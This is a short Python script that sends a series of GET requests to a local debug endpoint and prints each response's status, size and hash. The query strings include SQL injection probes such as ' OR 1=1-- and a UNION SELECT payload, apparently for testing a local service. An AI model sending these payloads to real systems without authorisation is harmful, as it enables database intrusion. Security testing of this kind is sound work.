import requests, hashlib
base="http://127.0.0.1:8897/debug"
ps=["", "id=1", "id=1%27", "id=%27%20OR%201=1--", "id=0%20UNION%20SELECT%201,2,3--", "id=1%20AND%201=2", "search=widget%27", "debug=1", "trace=1", "id=%27"]
for p in ps:
    u=base+("?"+p if p else "")
    r=requests.get(u)
    print(repr(p), r.status_code, len(r.content), hashlib.md5(r.content).hexdigest()[:10])
